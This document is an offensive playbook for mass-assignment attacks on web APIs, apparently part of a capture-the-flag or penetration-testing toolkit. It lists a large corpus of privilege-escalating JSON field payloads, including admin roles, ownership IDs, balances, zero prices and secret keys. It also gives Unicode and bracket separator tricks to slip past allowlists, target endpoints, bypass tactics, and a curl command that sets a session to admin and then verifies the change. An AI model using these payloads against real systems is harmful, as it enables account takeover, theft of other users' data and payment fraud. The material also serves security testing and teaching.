# Mass assignment — when the update binds the owner field

The endpoint binds every body field to the model — the `user_id`/
`owner_id`/`role` field that names the owner is the IDOR.

---

## 1. The mechanism

```python
def update(request):
    obj = Model.get(request.id)
    for k, v in request.json.items():   # binds EVERY field
        setattr(obj, k, v)
    obj.save()
```

`{"user_id":42}` or `{"role":"admin"}` reaches the model — the
ownership/role field is settable.

## 2. The field names — owner / role / flags

```json
{"user_id":1} {"userId":1} {"uid":1} {"owner":1} {"owner_id":1}
{"ownerId":1} {"author":1} {"author_id":1} {"created_by":1}
{"createdBy":1} {"account":1} {"account_id":1} {"tenant":1}
{"tenant_id":1} {"org":1} {"org_id":1} {"team":1} {"team_id":1}
{"belongs_to":1} {"parent":1} {"parent_id":1} {"assigned_to":1}
{"assignedTo":1} {"target":1} {"subject":1}

{"role":"admin"} {"role_id":1} {"roleId":1} {"roles":["admin"]}
{"groups":["admin"]} {"is_admin":true} {"isAdmin":true} {"admin":true}
{"is_staff":true} {"isStaff":true} {"staff":true}
{"is_superuser":true} {"isSuperuser":true} {"superuser":true}
{"is_moderator":true} {"isModerator":true} {"moderator":true}
{"is_owner":true} {"isOwner":true} {"is_root":true} {"isRoot":true}
{"root":true} {"is_system":true} {"isSystem":true} {"system":true}
{"is_service":true} {"service":true} {"is_internal":true} {"internal":true}
{"is_operator":true} {"operator":true} {"is_support":true} {"support":true}
{"default_admin":true} {"site_admin":true} {"tenant_admin":true}
{"org_admin":true} {"account_admin":true} {"billing_admin":true}
{"security_admin":true} {"sudo":true} {"su":true} {"god":true}
{"godmode":true} {"master":true} {"privileged":true} {"elevated":true}
{"vip":true} {"debug":true} {"dev":true} {"developer":true}

{"permission_level":99} {"access_level":99} {"level":99}
{"user_level":99} {"privilege":99} {"permissions":["*"]}
{"scopes":["*"]} {"scope":"*"} {"authorities":["ROLE_ADMIN"]}
{"verified":true} {"email_verified":true} {"active":true}
{"approved":true} {"confirmed":true} {"activated":true} {"enabled":true}
{"banned":false} {"suspended":false} {"locked":false} {"disabled":false}

{"balance":999999} {"credits":999999} {"points":999999}
{"score":999999} {"wallet":999999} {"pro":true} {"premium":true}
{"paid":true} {"subscribed":true} {"licensed":true} {"plan":"pro"}
{"plan":"admin"} {"tier":"admin"} {"subscription":"admin"}
{"price":0} {"amount":0} {"total":0} {"cost":0} {"discount":100}
{"payment_status":"paid"} {"order_status":"paid"}

{"api_key":"x"} {"access_token":"x"} {"secret":"x"} {"token":"x"}
{"password":"x"} {"private_key":"x"} {"signing_key":"x"}
{"client_secret":"x"} {"app_secret":"x"} {"webhook_secret":"x"}
{"jwt_secret":"x"} {"session_secret":"x"} {"secret_key":"x"}
```

## 3. The nested/dotted/b array-index forms

```json
{"role":"admin"}              — flat
{"user":{"role":"admin"}}     — nested JSON
{"user_role":"admin"}         — flat joined
{"user[role]":"admin"}        — Rails/PHP bracket param
{"user.role":"admin"}         — dotted key
{"user\\role":"admin"}        — backslash
{"user'role":"admin"}         — quote
{"user\u002erole":"admin"}    — encoded dot
{"user\u005crole":"admin"}    — encoded backslash
{"user\uff0erole":"admin"}    — fullwidth dot
{"user\uff1arole":"admin"}    — fullwidth colon
{"user\u2215role":"admin"}    — division slash
{"user\u2216role":"admin"}    — set minus
{"user\u2044role":"admin"}    — fraction slash
{"data":{"user":{"role":"admin"}}}
{"attributes":{"user":{"role":"admin"}}}
{"input":{"user":{"role":"admin"}}}
{"params":{"user":{"role":"admin"}}}
{"update":{"user":{"role":"admin"}}}
{"doc":{"owner":1}}
{"object":{"user_id":1}}
{"record":{"created_by":1}}
{"entity":{"author":1}}
{"item":{"user":1}}
{"model":{"owner":1}}
{"resource":{"account":1}}
{"entry":{"tenant":1}}
{"node":{"org":1}}
{"edge":{"team":1}}
{"vertex":{"group":1}}
```

```
role[]=admin
role[0]=admin
user[role]=admin
user[role][]=admin
user[0][role]=admin
data[user][role]=admin
data[0][user][role]=admin
attributes[user][role]=admin
attributes[0][user][role]=admin
fields[user][role]=admin
input[user][role]=admin
params[user][role]=admin
args[user][role]=admin
query[user][role]=admin
filter[user][role]=admin
where[user][role]=admin
update[user][role]=admin
doc[user][role]=admin
object[user][role]=admin
entity[user][role]=admin
record[user][role]=admin
item[user][role]=admin
model[user][role]=admin
resource[user][role]=admin
entry[user][role]=admin
node[user][role]=admin
```

The `user.role` separator variants — a parser that splits on `.` won't
see `user\u002erole` as nested, but the binder may treat it as the
`user.role` field. The separator-confusion is the mass-assign bypass.

## 4. The endpoint shapes

- `POST /register` / `POST /signup` — create binds the privileged field.
- `POST /profile` / `POST /me` / `PUT /me` / `PATCH /me` — the update.
- `POST /settings` / `POST /preferences` — the settings update.
- `POST /api/users` / `PUT|PATCH /api/users/{id}` — the API.
- `POST /api/register` / `POST /api/signup`.
- `POST /api/users/42/role` — a role setter.
- `POST /oauth/register`.
- `POST /checkout` / `POST /order` — a price/role field in the order.

## 5. The bypass paths

- The model binds every field → send the privileged name.
- A `fillable`/`whitelist` exists → try the names that escape it
  (`user_role`, `user[role]`, nested, `user\u002erole`).
- A `guarded`/`blacklist` exists → it's incomplete — try variants
  (`_role`, `role_`, `Role`, `ROLE`, `r0le`).
- The field is `readonly` → a different name reaches it.
- The update loops `for k,v in body` → a key the handler didn't expect
  still binds.
- The relation carries it — `user.role`, `author.role`, `doc.owner`.

## 6. Discovering the field name

- The register/update response leaks the schema (`{"role":"user"}`).
- `GET /api/me`/`GET /api/users/1` returns the field.
- Introspection/schema (GraphQL) names it.
- A `?fields=`/`?include=` reveals it.
- The source names it.
- An invalid-field error names the valid ones.
- The corpus above — the response tells you which bound.

## 7. The write-then-read proof

```bash
curl -b me.cookies -X PATCH "$BASE/api/users/me" -d '{"role":"admin"}'
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/me" --header "Cookie: session=$ME" \
  --evidence-regex '"role"\s*:\s*"admin"' --evidence-kind impact \
  --on-match confirms --on-miss refutes
```

`"role":"admin"` in `/api/me` after the PATCH = the field bound.

## 8. The owner-field rewrite

`PATCH /objects/42 {"user_id":<your_id>}` — reassign the object's owner
to you → `GET /objects/42` now reads it as yours. The write-IDOR is the
pivot to read.

## 9. The "the setter is a separate route" shape

`POST /api/users/42/promote` / `POST /api/users/42/make-admin` /
`POST /api/users/42/grant-role` — a dedicated role-setter that doesn't
check the caller's privilege is the mass-assign-as-route.

## 10. Falsifier

The privileged field is filtered — `PATCH` returns the object unchanged
or `400`/`403` on the field. The whitelist is complete. Record the
negative — mass-assign dead for this route.
